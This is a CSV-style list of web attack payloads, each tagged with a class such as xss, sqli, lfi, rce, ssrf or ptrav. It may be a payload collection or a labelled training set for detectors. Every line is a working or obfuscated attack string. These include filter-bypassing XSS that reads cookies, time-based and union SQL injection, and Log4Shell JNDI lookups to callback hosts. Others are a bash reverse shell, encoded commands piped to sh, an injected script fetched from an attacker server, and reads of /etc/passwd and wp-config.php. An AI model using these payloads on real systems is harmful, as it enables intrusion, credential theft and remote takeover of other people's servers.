6'%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/,xss,,,,,,
&quot;&gt;&lt;img src=x onerror=confirm(1);&gt;,xss,,,,,,
file:/etc/passwd?/,lfi,,,,,,
file:/etc/passwd%3F/,lfi,,,,,,
file:/etc%252Fpasswd/,lfi,,,,,,
file:/etc%252Fpasswd%3F/,lfi,,,,,,
file:///etc/?/../passwd,lfi,,,,,,
file:///etc/%3F/../passwd,lfi,,,,,,
file:${br}/et${u}c/pas${te}swd?/,lfi,,,,,,
file:$(br)/et$(u)c/pas$(te)swd?/,lfi,,,,,,
`\x61\x6c\x65\x72\x74\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x64\x6f\x6d\x61\x69\x6e\x29?`,,,,,,,
"?XOR(if(now()=sysdate(),sleep(5*5),0))OR?",sqli,,,,,,
"= onfocus=$.ajax({url:?http://&#8217;.concat(?yourxsshunder .xss.ht?),dataType:?script?,success:?success?})",xss,,,,,,
<input id=?a?value=?global?><input id=?b?value=?E?><input ?id=?c?value=?val?><input id=?d?value=?aler?><input id=?e?value=?t(documen?><input id=?f?value=?t.domain)?><svg+onload[\r\n]=$[a.value+b.value+c.value](d.value+e.value+f.value)>,xss,,,,,,
?><img src=1 onmouseleave=print()>,xss,,,,,,
uniUNIONon,sqli,,,,,,
<a?/onclick=(confirm)(document.cookie)>Click Here!,xss,,,,,,
<svg onload=prompt%26%230000000040document.domain)>,xss,,,,,,
<svg onload=prompt%26%23?000000028;document.domain)>,xss,,,,,,
<x/onclick=globalThis&lsqb;?\u0070r\u006f?+?mpt?]&lt;)>clickme,xss,,,,,,
"test?,prompt%0A/*HelloWorld*/(document.domain)",xss,,,,,,
? <a id=x tabindex=1 onbeforedeactivate=print(`XSS`)></a><input autofocus> ?,xss,,,,,,
<svg onload=prompt%26%230000000040document.domain)>,xss,,,,,,
<svg onload=prompt%26%23?000000028;document.domain)>,xss,,,,,,
../et*/pas**d,lfi,,,,,,
<a href=ja%26Tab%3bvasc%26Tab%3bript:prompt`1`>pwn</a>,xss,,,,,,
<details+/'on+/ontoggle=1^confirm(document.domain)+open//,xss,,,,,,
"<sVg/onfake=""x=y""oNload=;1^(co\u006efirm)``^1//",xss,,,,,,
"<img src=1 href=1 onerror=""javascript:alert('HEJAP ZAIRY AL-SHARIF')""></img>",xss,,,,,,
"""><sc<>ript><onxXxxXXxXXXxx=()%20autofoco%20onmouseover=alert(""HEJAP ZAIRY AL-SHARIF"")></scr<>ipt>",xss,,,,,,
t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:},rce,,,,,,
<!--><svg+onload=%27top[%2fal%2f%2esource%2b%2fert%2f%2esource](document.cookie)%27>,xss,,,,,,
"""><svg%20onload=alert%26%230000000040""mysanismine"")>",xss,,,,,,
"%00""><img src=x onerror=alert`1`//",xss,,,,,,
<iframe+/ON+onload=%20alert(/str0d/)>,xss,,,,,,
"""<a href=""""/*"""">*/)});function+__MobileAppList(){alert(1)}//>""",xss,,,,,,
${j${k8s:k5:-ND}${sd:k5:-${123%25ff:-${123%25ff:-${upper:ı}:}}}ldap://xxx.dnslog.cn},rce,,,,,,
${jndi${123%25ff:-}:ldap://xxx.dnslog.cn},rce,,,,,,
<h1/%6f%6e/oNclicK=alert``>XSS,xss,,,,,,
<svg/%6f%6e/oNloaD=alert``>,xss,,,,,,
${jndi${nagli:-:}ldap:${::-/}/${hostName}.anything.interact.sh/a}},rce,,,,,,
%27/**/%256fR/**/50%2521%253D22%253B%2523,sqli,,,,,,
"0%20/*!union*/%20/*!select*/%201,2,3,4,user(),6,7,version(),9,10,11",sqli,,,,,,
"<svg onpointerenter=jQuery.globalEval(""al""+""ert(documen""+""t.cooki""+""e)"");>",xss,,,,,,
<svg onload=alert&#0000000040document.cookie)>,xss,,,,,,
<img+src=x+on<!--ram-->error=ale<!--ram-->rt(1)>,xss,,,,,,
<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>,xss,,,,,,
"""firstname"":""<img src ='"",""lastname"":""'onerror=print()>""",xss,,,,,,
"""><a/\test=""%26quot;x%26quot;""href='%01javascript:/*%b1*/;location.assign(""//hackerone.com/stealthy?x=""+location)'>Click",xss,,,,,,
"""><img src=1 onmouseleave=print()>",xss,,,,,,
""" on<embed>click=""a=al<embed>ert,a(cookie)",xss,,,,,,
%27%09),%0d%0a%09%09[1].find(alert)//,xss,,,,,
<x/onclick=globalThis&lsqb,'\u0070r\u006f'+'mpt']&lt,)>clickme,xss,,,,
"test"",prompt%0A/*HelloWorld*/(document.domain)",xss,,,,,,
"/*!50000and*/ /*!50000extractvalue*/(0x0a,/*!50000concat(0x0a,(select JSON_OBJECT(1, current_user())))*/)",sqli,,,,,,
ax6zt%2522%253e%253cscript%253ealert%2528document.domain%2529%253c%252fscript%253ey6uu6,xss,,,,,,
<ifram%0de src=jav%0dascript:alert(document.cookie)>,xss,,,,,,
-setTimeout`prompt\u0028document.domain\u0029`-',xss,,,,,,
cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,ptrav,,,,,,
,+$u+cat+/etc$u/passwd$u,rce,,,,,
,+$u+cat+/etc$u/passwd+\#,rce,,,,,
/???/??t+/???/??ss??,rce,,,,,,
/?in/cat+/et?/passw?,rce,,,,,,
“><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>,xss,,,,,,
<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>,xss,,,,,,
“><sVg/OnLuFy=”X=y”oNloaD=,1^confirm(1)>/“^1//,xss,,,,,
<x/onclick=globalThis&lsqb,’\u0070r\u006f’+’mpt’]&lt,)>clickme,xss,,,,
\/><img src=x onerror=”a=()=>{c=0,for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}},self[Object.keys(self)[a()]](document.domain)”>,xss,,,,
-1′ and .0union+distinct+select+1+–+,sqli,,,,,,
qaramany'%2buser_name(@@version)--,sqli,,,,,,
1%27/** /%256FR/** /50%2521%253D22%253B%2523,sqli,,,,,,
%2522%252B%254F%2552%252B%2531%2521%253D%2537%2523,sqli,,,,,,
"1 or REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW(‘{hex_query}’))),’>{brute_force}(.+)?@<‘,’i’)",sqli,,,,,,
printf dW5hbWUgLWE= | base64 -d | sh,rce,,,,,,
target[.]com/download?url=[shortened link of http://ssrfip/download?url=file:///etc/passwd],ssrf,,,,,,
; /b'i'n\/?at /e't'c\/\pa??\wd,rce,,,,,,
a=ca;b=t;$a$b /et*/p*s*wd,rce,,,,,,
$(printf 'hsab/nib/ e- 4321 1.0.0.721 cn'|rev),rce,,,,,,
cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,rce,,,,,,
"<xhzeem attr="" --- x=""=='='onmouseover=confirm`xhzeem` style=""display:block;width:1000px;height:1000px;background:red""> --- "">",xss,,,,,,
"""><sVg/OnLuFy=""X=y""oNloaD=;1^confirm(1)>/``^1//",xss,,,,,,
"""><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>",xss,,,,,,
cat$IFS$9${PWD%%[a-z]*}e*c${PWD%%[a-z]*}p?ss??,rce,,,,,,
%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain),xss,,,,,,
"""><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>",xss,,,,,,
-1' and .0union+distinct+select+1+--+,sqli,,,,,,
"""><p only=1337 onmouseenter=window.location.href=//attacker.site>",xss,,,,,,
<img%09'%0asrc='%5c%0d%7c'%00=''onerror=%0d%09%0a%60%60.sup(eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==')))>,xss,,,,,,
"%3CF5%3E/strrr/821}+union+%23%0a+distinctrow%0b/**/select+1,2,3--{%3CF5%3E/**/TRUE",sqli,,,,,,
"??""><img/src/onerror=alert(document.domain)>",xss,,,,,,
<a/+/OnMoUsEOVEr+=+(confirm)(document.domain)>,xss,,,,,,
<sVg %00%00%00//onsite ONloAd=\u0061\u006C\u0065\u0072\u0074`/AmoloHT/`//>,xss,,,,,,
${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}},rce,,,,,,
parameter=<svg/&parameter=onload=alert()>,xss,,,,,,
"""/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd /cgi-bin/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd /cgi-bin/.%2%65/.%2%65/.%2%65/.%2%65/etc/passwd /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh",ptrav,,,,,,
"org.apache.commons.io.IOUtils.toString(java.lang.Runtime.getRuntime().exec(""uname -a"").getInputStream())",rce,,,,,,
<details onauxclick=confirm`xss`></details>,xss,,,,,,
"<svg onload=alert&#0000000040""1"")>",xss,,,,,,
"<a data-orig-ref="" alert(1)"" data-orig-proto=""javascript"" href=""javascript:// alert(1)"">clickme</a>",xss,,,,,,
"javas%09cript:ghi=%27)%3E%27,you=%27(top%5B%22docum%22%2B%22ent%22%5D.cookie%27;HTMLElement%5B%27inne%27%2B%27rHTML%27%5D=%27%3CSvg/OnLoad=alert%27%2Brob%2Beco;//",xss,,,,,,
"""${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\',\$\'\\$(($((${##}<<${##}))#${##}${##}$#${##}${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\',\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#$#))\'} ${!#}<<<{\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}$#))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\',\$\'\\$(($((${##}<<${##}))#${##}${##}$#${##}${##}${##}))\'\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\',\$\'\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}$#$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}${##}${##}))\\$(($((${##}<<${##}))#${##}${##}${##}$#$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#$#${##}${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#${##}${##}$#))\\$(($((${##}<<${##}))#${##}$#$#$#${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#$#${##}$#$#$#$#))\\$(($((${##}<<${##}))#${##}$#$#${##}${##}${##}$#${##}))\\$(($((${##}<<${##}))#${##}$#${##}$#$#${##}${##}${##}))\'}",rce,,,,,,
"’%2buser_name(convert(int,(SESSION_USER))) — ’%2buser_name(UPPER(‘sql+tutorial+is+fun!’)) — ’%2buser_name(IIF(5=4,+’YES’,+’HackedBy_c0nqr0r&0x4m’)) — ’%2buser_name(convert(int,(db_name()))) —",sqli,,,,,,
“autofocus onclick=’&#97;lert()’,xss,,,,,,
“autofocus onFocUs=’find(l\u{6F}cati\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)’,xss,,,,,,
"<img src=a onerror=""var x=document.createElement('script');x.src='<attacker_server>/api.js';document.body.appendChild(x);"">",xss,,,,,,
/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../,ptrav,,,,,,
xss'''><iframe srcdoc='%26it;script>;prompt` ${document.domain}`%26it;/script>'>,xss,,,,,,
bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ipAddress/port%200%3E%261%27,rce,,,,,,
php://filter/write=convert.iconv.utf-8.utf-16le|convert.quoted-printable-encode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log,rce,,,,,,
cat /???/??ss??,rce,,,,,,
cat /e??/p????? ,rce,,,,,,
"[""');alert('xss');//""]@xyz.xxx",xss,,,,,,
javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain,xss,,,,,,
"<c/onpointerrawupdate=d=document,b=%27%60%27,d[%27loca%27%2B%27tion%27]=%27javascript%26colon;aler%27%2B%27t%27%2Bb%2Bdomain%2Bb>",xss,,,,,,
"echo '61776b20277b7072696e742024307d27202f3f3f2a632f3f2a7764' | xxd -p -r | sh echo ""U2FsdGVkX19AYgtqPB2JND9fswlDf/i2ZWP8FUTyqHS+7EUuA2meAMm9Cd1Z67lq1+e5qEUyJmBsvFsu5yzI3aftPy8q/qjIwVo8feoh1JM="" | openssl enc -d -des3 -base64 -pass pass:bex -pbkdf2 | sh | sh",rce,,,,,,
<svg/onload=location/**/='http://GH0ST.xss.ht/'+document.dom�,xss,,,,,,
autofocus ' onfocus='alert(document.domain)',xss,,,,,,
"""autofocus onfocus='alert(document.domain)' ",xss,,,,,,
%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%BCscript%E5%98%BEalert(1),%E5%98%BC/script%E5%98%BE,xss,,,,,
"""') AND (updatexml(1,concat(0x7e,(select user()),0x7e),1))-- qw""",sqli,,,,,,
"f'1) UNION SELECT 1,{title},concat(""fa fa-"",user_pass),3,4,5,6 from wp_users%23",sqli,,,,,,
action=parse-media-shortcode&post_ID=1&shortcode=[gigpress_related_shows sort=' AND (SELECT 42 FROM (SELECT(SLEEP(2)))b),sqli,,,,,,
%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(/xss/),xss,,,,,,
1%20AND%20(SELECT%209312%20FROM%20(SELECT(SLEEP(5)))hYkP,sqli,,,,,,
../../../wp-config.php ,lfi,,,,,,
111+AND+(SELECT+5926+FROM+(SELECT(SLEEP(5)))erUA) ,sqli,,,,,,
1&a%2522%253e%253cscript%253ealert%2528/xss/%2529%253c%252fscript%253e,xss,,,,,,
%3Cscript%3Ealert(`xss`)%3C/script%3E,xss,,,,,,
"""><a href=jav&#x0D;ascript&colon;top[8680439..toString(30)](document.domain)>Click</a>",xss,,,,,,
/???/???/c?t$IFS/???/p?s?w?,ptrav,,,,,,
"<!DOCTYPE foo [<!ENTITY % a ""&#x3c;&#x21; ... omitted ...", xxe,,,,,,
"{""sku"":""a\"" AND (SELECT 42 FROM (SELECT(SLEEP(5)))wlHd)-- pOeU""}",sqli,,,,,,
"><BODy onbeforescriptexecute=""x1='cookie';c=')';b='a';location='jav'+b+'script:con'+'fir\u006d('+'document'+'.'+x1+c"">",xss,,,,,,
"<a href=""http://example.com;"" onmouseover=""z=top;z[/al/.source%2b/ert/.source](8);//test.com/""",xss,,,,,,
<svg>on%20onload%3D(“XSS”)(document.domain)<%2Fsvg>,xss,,,,,,
http://example.com%22%3E%3Csvg%3E%3Cimage%20xlink:href=%22path/to/image.jpg%22%20onerror=confirm(document.location)%3E,xss,,,,,,
<img src onerror=%26emsp,prompt`${document.domain}`>,xss,,,,,
testtest”+onmouseover%3D”alert%26%230000000040%3Bdocument[‘cookie’]),xss,,,,,,
"{{var this.getTemplateFilter().addAfterFilterCallback(""system"").filter(""whoami"")}}",rce,,,,,,
SELECT * FROM test WHERE id = 1 WAITFOR DELAY'0:0:5',sqli,,,,,,
////evil%E3%80%82com,redir,,,,,,
-16'and@:=,sqli,,,,,,
"""><svg%20onload=alert%26%230000000040""1"")>",xss,,,,,,
dfsse%3cimg%20src%3da%20onerror%3dalert(1)%3ez1668cyj2pi,xss,,,,,,
"javas%09cript:ghi=%27)%3E%27,you=%27(top%5B%22docum%22%2B%22ent%22%5D.cookie%27;HTMLElement%5B%27inne%27%2B%27rHTML%27%5D=%27%3CSvg/OnLoad=alert%27%2Brob%2Beco;//",xss,,,,,,
&lt,script&gt,,xss,,,,
"null /*!12345union*/ select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15",sqli,,,,,,
"""&gt;&lt;Svg Only=1 OnLoad=confirm(atob(""Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ==""))&gt;",xss,,,,,,
"<=script>=alert(""hacked"")<=/scirpt>=",xss,,,,,,
"services.logging.getLogger(""foo"").error(""Job content executed"")",rce,,,,,,
/api/system/debug/support/bundle/download/{filename},lfi,,,,,,
<SvG><set%0Aonbegin%0A=%0aa=confirm,a%28%60xss%60)/x>,xss,,,,,
%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D,sqli,,,,,,
javascript%3Avar%20a%3D%22ale%22%3Bvar%20b%3D%22rt%22%3Bvar%20c%3D%22%28%29%22%3BdecodeURI%28%22%26lt%3Bbutton%20popovertarget%3Dx%26gt%3BClick%20me%26lt%3B%2Fbutton%26gt%3B%26lt%3Bhvita%20onbeforetoggle%3D%22%2Ba%2Bb%2Bc%2B%22%20popover%20id%3Dx%26gt%3BHvita%26lt%3B%2Fhvita%26gt%3B%22%29,xss,,,,,,
../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml,lfi,,,,,,
%7B%22name%22%3A%22test.php%22%2C%22data%22%3A%22data%3Aimage%2Fpng%3Bbase64%2CiVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs%2FPljAc143k%2FyPi9t%2BX9N9qif38ePJv1%2FvBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII%3D%22%7D,rce,,,,,,
